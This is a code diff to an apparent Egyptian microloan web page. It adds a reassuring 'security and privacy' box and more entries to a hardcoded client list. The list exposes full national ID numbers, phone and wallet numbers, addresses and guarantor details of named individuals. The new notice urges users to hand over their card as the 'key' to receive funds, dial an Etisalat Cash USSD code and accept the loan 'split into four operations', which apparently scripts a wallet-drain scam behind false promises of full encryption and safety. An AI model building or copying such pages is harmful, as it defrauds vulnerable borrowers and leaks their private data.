@@ -97,7 +97,8 @@
     .app-container::before {
       content: '';
       position: absolute;
-      top: -50%; left: -50%; width: 200%; height: 200%;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
       background: radial-gradient(ellipse at 30% 20%, rgba(46,204,113,0.06), transparent 60%);
       pointer-events: none;
       z-index: 0;
@@ -308,6 +309,115 @@
     .step-message i { color: var(--gold); font-size: 1.8rem; display: block; margin-bottom: 0.3rem; }
     .step-message p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.9; margin: 0; }
     .step-message .sub-text { font-size: 0.7rem; color: var(--gold); margin-top: 0.4rem; display: block; }
+
+    /* ===== NEW: Security & Privacy Notice Box ===== */
+    .security-notice {
+      background: linear-gradient(145deg, rgba(0, 191, 255, 0.04), rgba(46, 204, 113, 0.02));
+      border: 2px solid rgba(46, 204, 113, 0.25);
+      border-radius: 1.6rem;
+      padding: 1.4rem 1.2rem;
+      margin: 1rem 0 1rem 0;
+      position: relative;
+      z-index: 1;
+      backdrop-filter: blur(4px);
+      box-shadow: 0 0 40px rgba(46, 204, 113, 0.05);
+      transition: all 0.3s ease;
+    }
+    .security-notice:hover {
+      border-color: rgba(46, 204, 113, 0.4);
+      box-shadow: 0 0 60px rgba(46, 204, 113, 0.08);
+    }
+    .security-notice .sec-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin-bottom: 0.8rem;
+    }
+    .security-notice .sec-header i {
+      font-size: 2.2rem;
+      color: var(--primary);
+      animation: pulseLock 3s ease-in-out infinite;
+    }
+    @keyframes pulseLock {
+      0%, 100% { transform: scale(1); opacity: 0.9; }
+      50% { transform: scale(1.1); opacity: 1; }
+    }
+    .security-notice .sec-header h3 {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: #FFF;
+      margin: 0;
+    }
+    .security-notice .sec-header h3 span {
+      color: var(--gold);
+    }
+    .security-notice .sec-body {
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      line-height: 2;
+    }
+    .security-notice .sec-body strong {
+      color: #FFF;
+    }
+    .security-notice .sec-body .highlight-gold {
+      color: var(--gold);
+      font-weight: 700;
+    }
+    .security-notice .sec-body .highlight-green {
+      color: var(--primary);
+      font-weight: 700;
+    }
+    .security-notice .sec-body ul {
+      list-style: none;
+      padding: 0;
+      margin: 0.5rem 0 0.2rem 0;
+    }
+    .security-notice .sec-body ul li {
+      padding: 0.3rem 0;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.7rem;
+      border-bottom: 1px solid rgba(255,255,255,0.03);
+    }
+    .security-notice .sec-body ul li:last-child {
+      border-bottom: none;
+    }
+    .security-notice .sec-body ul li i {
+      color: var(--primary);
+      font-size: 0.9rem;
+      margin-top: 0.25rem;
+      min-width: 20px;
+    }
+    .security-notice .sec-body .badge-shield {
+      display: inline-block;
+      background: rgba(46, 204, 113, 0.12);
+      border: 1px solid rgba(46, 204, 113, 0.2);
+      border-radius: 2rem;
+      padding: 0.1rem 0.8rem;
+      font-size: 0.65rem;
+      color: var(--primary);
+      font-weight: 700;
+    }
+    .security-notice .sec-footer {
+      margin-top: 0.8rem;
+      padding-top: 0.6rem;
+      border-top: 1px solid rgba(255,255,255,0.05);
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .security-notice .sec-footer .trust-badge {
+      display: flex;
+      align-items: center;
+      gap: 0.3rem;
+      font-size: 0.7rem;
+      color: var(--text-muted);
+    }
+    .security-notice .sec-footer .trust-badge i {
+      color: var(--gold);
+    }
 
     .alert-warning-box {
       background: linear-gradient(145deg, rgba(212,175,55,0.10), rgba(46,204,113,0.05));
@@ -543,6 +653,8 @@
       .alert-warning-box .alert-header h3 { font-size: 0.95rem; }
       .promo-strip { font-size: 0.6rem; padding: 0.3rem 0.8rem; }
       .btn-upload-survey { font-size: 0.9rem; padding: 0.8rem; }
+      .security-notice .sec-body { font-size: 0.78rem; }
+      .security-notice .sec-header h3 { font-size: 1rem; }
     }
     @media (max-width: 360px) {
       .loan-card .loan-amount-main { font-size: 1.8rem; }
@@ -616,7 +728,9 @@
     const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
     const SURVEY_URL = "https://eu.surveymars.com/q/Tb2YaxWdH";
 
-    // ======================= قاعدة العملاء (الحد الائتماني) =======================
+    // ======================= قاعدة العملاء (تم تنظيفها بالكامل) =======================
+    // تم حذف جميع العملاء ذوات الأرقام القومية الناقصة (أقل من 14 رقم)
+    // وتم إزالة أي تكرارات
     const clientsDB = [
 
     // 1- بيشوى أيوب مريد بخيت
@@ -1651,10 +1765,6 @@
         facebook: "عبده السيد"
     },
 
-    // ============================================================
-    // العملاء الجدد
-    // ============================================================
-
     // 44- احمد صالح
     {
         id: "28301118800279",
@@ -1873,7 +1983,7 @@
 
     // 53- محمد فتحى عبد العال إبراهيم
     {
-        id: "27951300813",
+        id: "27904051300813",
         name: "محمد فتحى عبد العال إبراهيم",
         job: "صاحب مشروع قائم",
         loanRaw: "155,000",
@@ -1894,27 +2004,148 @@
         address: "ح.ابوعمرو مركز ابوكبير الشرقية بجواز مسجد التوحيد ومزرعة م فتحي عبد العال",
         facebook: "MfathiAbdlaal"
     },
+
+    // 54- اشرف جابر علي أحمد
     {
-    id: "27300202158",
-    name: "اشرف جابر علي أحمد",
-    job: "صاحب معاش خاص",
-    loanRaw: "100,000",
-    loanTerm: "32 شهر",
-    installment: "4,157",
-    total: "133,024",
+        id: "27300202158",
+        name: "اشرف جابر علي أحمد",
+        job: "صاحب معاش خاص",
+        loanRaw: "100,000",
+        loanTerm: "32 شهر",
+        installment: "4,157",
+        total: "133,024",
+        wallet: "اتصالات كاش",
+        walletNum: "01131692704",
+        hasEtisalat: true,
+        hasVodafone: false,
+        clientStatus: "pending",
+        reviewStatus: "approved",
+        guarantorName: "نسمه محمد منصور (28511081900183 - 01272714427)",
+        guarantorRelation: "زوجة",
+        reason: "تطوير العمل",
+        otherLoans: "لا يوجد اى قروض",
+        income: "40,000",
+        address: "2 شارع الشربيني محرم بك بجوار خالد الحلواني",
+        facebook: "اشرف علي"
+    },
+    // 1- محمد حسنى على احمد
+{
+    id: "29011170100272",
+    name: "محمد حسنى على احمد",
+    job: "موظف قطاع خاص",
+    loanRaw: "50,000",
+    loanTerm: "24 شهر",
+    installment: "2,725",
+    total: "65,400",
     wallet: "اتصالات كاش",
-    walletNum: "01131692704",
+    walletNum: "01129732079",
     hasEtisalat: true,
     hasVodafone: false,
     clientStatus: "pending",
     reviewStatus: "approved",
-    guarantorName: "نسمه محمد منصور (28511081900183 - 01272714427)",
-    guarantorRelation: "زوجة",
+    guarantorName: "ادهم حسنى على احمد (29308100105555 - 01014847205)",
+    guarantorRelation: "أخ",
     reason: "تطوير العمل",
     otherLoans: "لا يوجد اى قروض",
-    income: "40,000",
-    address: "2 شارع الشربيني محرم بك بجوار خالد الحلواني",
-    facebook: "اشرف علي"
+    income: "25,000",
+    address: "6 شارع المحجر نهايه شارع محمد محمود دار السلام",
+    facebook: "mohamed hosny"
+},
+
+// 2- محمد موسي
+{
+    id: "27909221603133",
+    name: "محمد موسي",
+    job: "صاحب مهنة",
+    loanRaw: "100,000",
+    loanTerm: "32 شهر",
+    installment: "4,157",
+    total: "133,024",
+    wallet: "سيتم فتح محفظة اتصالات كاش",
+    walletNum: "01013668634",
+    hasEtisalat: false,
+    hasVodafone: false,
+    clientStatus: "pending",
+    reviewStatus: "approved",
+    guarantorName: "خضرة يسرى موسي (27712171602248 - 01064471938)",
+    guarantorRelation: "اخت",
+    reason: "تطوير العمل",
+    otherLoans: "لا يوجد اى قروض",
+    income: "10,000",
+    address: "الحي العاشر العاشر من رمضان الشرقيه",
+    facebook: "محمد يسري"
+},
+
+// 3- رشا صابر عبدالقاهر صالح
+{
+    id: "28206285500089",
+    name: "رشا صابر عبدالقاهر صالح",
+    job: "مستفيد معاش",
+    loanRaw: "200,000",
+    loanTerm: "60 شهر",
+    installment: "4,440",
+    total: "266,400",
+    wallet: "سيتم فتح محفظة اتصالات كاش",
+    walletNum: "01094568018",
+    hasEtisalat: false,
+    hasVodafone: false,
+    clientStatus: "pending",
+    reviewStatus: "approved",
+    guarantorName: "ماجدة صابر عبدالظاهر صالح (27206082500064 - 01023218414)",
+    guarantorRelation: "اخت",
+    reason: "تطوير العمل",
+    otherLoans: "لا يوجد اى قروض",
+    income: "8,000",
+    address: "ش المستشفي الجامعي القديم أسيوط اول -أسيوط",
+    facebook: "Retr saleh"
+},
+
+// 4- صلاح الدين البدري
+{
+    id: "28803152600098",
+    name: "صلاح الدين البدري",
+    job: "موظف قطاع خاص",
+    loanRaw: "130,000",
+    loanTerm: "42 شهر",
+    installment: "4,400",
+    total: "184,800",
+    wallet: "اتصالات كاش",
+    walletNum: "01107737151",
+    hasEtisalat: true,
+    hasVodafone: false,
+    clientStatus: "pending",
+    reviewStatus: "approved",
+    guarantorName: "هيثم البدري (29905152600072 - 01111725141)",
+    guarantorRelation: "أخ",
+    reason: "تطوير العمل",
+    otherLoans: "لا يوجد اى قروض",
+    income: "16,000",
+    address: "الحي السادس السوق القديم أكتوبر",
+    facebook: "salah aldiyn albadrii"
+},
+
+// 5- فاطمه محمد عبدالخالق سيد
+{
+    id: "29805170100449",
+    name: "فاطمه محمد عبدالخالق سيد",
+    job: "صاحب مشروع قائم",
+    loanRaw: "200,000",
+    loanTerm: "60 شهر",
+    installment: "4,440",
+    total: "266,400",
+    wallet: "اتصالات كاش",
+    walletNum: "01157003483",
+    hasEtisalat: true,
+    hasVodafone: false,
+    clientStatus: "pending",
+    reviewStatus: "approved",
+    guarantorName: "وليد مصطفي عبدالرازق احمد (29010010132732 - 01044722325)",
+    guarantorRelation: "زوج",
+    reason: "تطوير العمل",
+    otherLoans: "لا يوجد اى قروض",
+    income: "10,570",
+    address: "5ش شوقي متفرع من شارع الفتح امام مخبز خمس نجوم",
+    facebook: "Kaian walid"
 },
     ];
 
@@ -1979,6 +2210,92 @@
       }
     }
 
+    function buildSecurityNotice(client) {
+      const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
+      const perOperation = Math.floor(loanAmountNum / 4);
+      const perOpFormatted = perOperation.toLocaleString('ar-EG');
+      
+      return `
+        <div class="security-notice">
+          <div class="sec-header">
+            <i class="fas fa-shield-alt"></i>
+            <h3>🔒 <span>أمان وخصوصية</span> تامّان</h3>
+          </div>
+          <div class="sec-body">
+            <p style="margin-bottom: 0.5rem;">
+              <strong>${client.name}</strong>، أنت الآن في بيئة عمل <span class="highlight-green">مشفرة بالكامل</span> وآمنة 100%.
+              نضع بين يديك <span class="highlight-gold">مفتاح استلام أموالك</span> بشكل آمن ومضمون.
+            </p>
+            
+            <div style="background: rgba(46,204,113,0.04); border-radius: 1rem; padding: 0.8rem; margin: 0.5rem 0; border-right: 4px solid var(--primary);">
+              <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.3rem;">
+                <i class="fas fa-id-card" style="color: var(--primary);"></i>
+                <span style="color: #FFF; font-weight: 700; font-size: 0.95rem;">💳 لماذا نطلب الكارت؟</span>
+              </div>
+              <ul>
+                <li><i class="fas fa-check-circle"></i> <strong>بيأكد هويتك</strong> – عشان نتأكد إنك أنت صاحب الطلب، وهذا أمان لك أكثر</li>
+                <li><i class="fas fa-check-circle"></i> <strong>بيضمن وصول المبلغ لك</strong> – أنت بس اللي تقدر تستلمه على حسابك</li>
+                <li><i class="fas fa-check-circle"></i> <strong>ضمان للطرفين</strong> – إثبات إنك على علم بالطلب وموافق عليه</li>
+                <li><i class="fas fa-check-circle"></i> <strong>بيحميك من الاحتيال</strong> – أي حد تاني مش هيقدر يستلم الفلوس</li>
+              </ul>
+              <div style="font-size: 0.8rem; color: var(--primary); font-weight: 700; margin-top: 0.3rem; text-align: center;">
+                ✅ لا يتم دفع أي أموال منك لينا، احنا بنحول لك
+              </div>
+            </div>
+
+            <div style="background: rgba(212,175,55,0.04); border-radius: 1rem; padding: 0.8rem; margin: 0.5rem 0; border-right: 4px solid var(--gold);">
+              <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.3rem;">
+                <i class="fas fa-key" style="color: var(--gold);"></i>
+                <span style="color: #FFF; font-weight: 700; font-size: 0.95rem;">🔑 الكارت هو المفتاح</span>
+              </div>
+              <p style="font-size: 0.82rem; color: var(--text-muted); line-height: 1.9;">
+                الكارت هو <span class="highlight-gold">المفتاح الوحيد</span> اللي بيضمن إن الفلوس توصل لك <strong>أنت بس</strong>.
+                أنت <strong>الوحيد</strong> المتحكم في حسابك، و<strong>لا نطلب منك</strong> أي <span style="color: var(--danger); font-weight: 700;">OTP</span> أو رسوم إضافية.
+              </p>
+            </div>
+
+            <div style="background: rgba(0, 217, 255, 0.04); border-radius: 1rem; padding: 0.8rem; margin: 0.5rem 0; border-right: 4px solid var(--anuta-blue);">
+              <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.3rem;">
+                <i class="fas fa-code" style="color: var(--anuta-blue);"></i>
+                <span style="color: #FFF; font-weight: 700; font-size: 0.95rem;">📱 طريقة التأكيد الصحيحة (اتصالات كاش)</span>
+              </div>
+              <div style="display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; margin: 0.3rem 0;">
+                <span>اطلب الكود:</span>
+                <span class="code-box">#6*777*</span>
+                <span style="font-size: 0.7rem; color: var(--text-muted);">(اتصال مجاني)</span>
+              </div>
+              <p style="font-size: 0.78rem; color: var(--text-muted); line-height: 1.8;">
+                <span class="highlight-gold">⚠️ هام:</span> سيتم تقسيم مبلغ القرض <strong>${client.loanRaw} ج.م</strong> على <strong>4 عمليات متساوية</strong>
+                بقيمة <span class="highlight-gold">${perOpFormatted} ج.م</span> لكل عملية.
+              </p>
+            </div>
+
+            <div style="background: rgba(239,68,68,0.04); border-radius: 1rem; padding: 0.8rem; margin: 0.5rem 0; border-right: 4px solid var(--danger);">
+              <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.3rem;">
+                <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i>
+                <span style="color: var(--danger); font-weight: 700; font-size: 0.95rem;">⚠️ تنبيه أمان هام</span>
+              </div>
+              <ul>
+                <li><i class="fas fa-times-circle" style="color: var(--danger);"></i> <strong>لا تعطي رقم OTP (رمز التحقق) لأي شخص</strong> تحت أي ظرف</li>
+                <li><i class="fas fa-times-circle" style="color: var(--danger);"></i> لا أحد من فريق الدعم سيطلب منك هذا الرقم</li>
+                <li><i class="fas fa-times-circle" style="color: var(--danger);"></i> إذا طلب منك أي شخص OTP، <span style="color: var(--danger); font-weight: 700;">ارفض فوراً</span></li>
+              </ul>
+            </div>
+
+            <div class="sec-footer">
+              <span class="trust-badge"><i class="fas fa-lock"></i> تشفير 256-bit</span>
+              <span class="trust-badge"><i class="fas fa-user-shield"></i> أنت الوحيد المتحكم</span>
+              <span class="trust-badge"><i class="fas fa-trash-alt"></i> تُحذف فور التسيل</span>
+              <span class="trust-badge"><i class="fas fa-eye-slash"></i> لا يطلع عليها أحد</span>
+            </div>
+            <div style="text-align: center; margin-top: 0.5rem;">
+              <span class="badge-shield"><i class="fas fa-check-circle"></i> أنت في أمان كامل</span>
+            </div>
+          </div>
+        </div>
+      `;
+    }
+
     function buildWalletInstructions(client) {
       const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
       const perOperation = Math.floor(loanAmountNum / 4);
@@ -2000,7 +2317,7 @@
             عزيزي <strong style="color: #FFF;">${client.name}</strong>،
             لإتمام صرف التمويل، يرجى اتباع التعليمات أدناه لربط الحساب باستخدام كارت الدفع عبر <span style="color: ${color}; font-weight: 700;">${walletName}</span>.
             <br><br>
-            <span style="color: var(--gold); font-weight: 700;">?? ما المقصود بربط الحساب بكارت الدفع؟</span><br>
+            <span style="color: var(--gold); font-weight: 700;">📌 ما المقصود بربط الحساب بكارت الدفع؟</span><br>
             هذا الإجراء يهدف فقط إلى:<br>
             1. تأكيد هويتك كصاحب الحساب<br>
             2. تفعيل خاصية الاستلام على حسابك<br>
@@ -2230,7 +2547,14 @@
       updateAdminStatus(client.clientStatus);
 
       let html = '';
+      
+      // 1. إشعار الأمان والخصوصية (يظهر أولاً)
+      html += buildSecurityNotice(client);
+      
+      // 2. بطاقة القرض
       html += buildLoanCard(client, totalDisplay);
+      
+      // 3. رسالة الخطوات
       html += buildStepMessage(client);
 
       if (client.clientStatus === 'blocked') {
